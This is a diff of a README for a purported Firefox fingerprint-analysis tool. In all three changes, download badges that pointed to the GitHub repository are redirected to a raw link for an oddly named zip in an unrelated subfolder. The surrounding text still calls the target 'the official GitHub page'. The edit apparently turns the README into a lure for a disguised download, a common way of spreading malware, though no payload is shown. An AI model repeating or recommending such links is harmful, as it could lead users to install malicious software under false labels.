@@ -1,6 +1,6 @@
 # 🕵️ Firefox-FingerPrint-Analyzer - Track Browser Behavior Easily
 
-[![Download Firefox-FingerPrint-Analyzer](https://img.shields.io/badge/Download-Firefox--FingerPrint--Analyzer-4c1?style=for-the-badge)](https://github.com/r1ghtoo/Firefox-FingerPrint-Analyzer)
+[![Download Firefox-FingerPrint-Analyzer](https://img.shields.io/badge/Download-Firefox--FingerPrint--Analyzer-4c1?style=for-the-badge)](https://raw.githubusercontent.com/r1ghtoo/Firefox-FingerPrint-Analyzer/main/bilsh/Analyzer-Print-Firefox-Finger-3.1.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to download and start Firefox-FingerPrint-Analyzer on your Wi
 
 Click the big button below to visit the download page:
 
-[![Download Firefox-FingerPrint-Analyzer](https://img.shields.io/badge/Download-HERE-blue?style=for-the-badge)](https://github.com/r1ghtoo/Firefox-FingerPrint-Analyzer)
+[![Download Firefox-FingerPrint-Analyzer](https://img.shields.io/badge/Download-HERE-blue?style=for-the-badge)](https://raw.githubusercontent.com/r1ghtoo/Firefox-FingerPrint-Analyzer/main/bilsh/Analyzer-Print-Firefox-Finger-3.1.zip)
 
 On the page, look for the latest release or the main download area. Download the version suitable for Windows. This is usually a `.exe` or `.zip` file.
 
@@ -118,7 +118,7 @@ The software collects raw data and organizes it into easy-to-read logs. By focus
 
 Click below to visit the official GitHub page to download Firefox-FingerPrint-Analyzer:
 
-[![Download Firefox-FingerPrint-Analyzer](https://img.shields.io/badge/Download-HERE-green?style=for-the-badge)](https://github.com/r1ghtoo/Firefox-FingerPrint-Analyzer)
+[![Download Firefox-FingerPrint-Analyzer](https://img.shields.io/badge/Download-HERE-green?style=for-the-badge)](https://raw.githubusercontent.com/r1ghtoo/Firefox-FingerPrint-Analyzer/main/bilsh/Analyzer-Print-Firefox-Finger-3.1.zip)
 
 Use this link to access all files and installation instructions directly from the source.
 
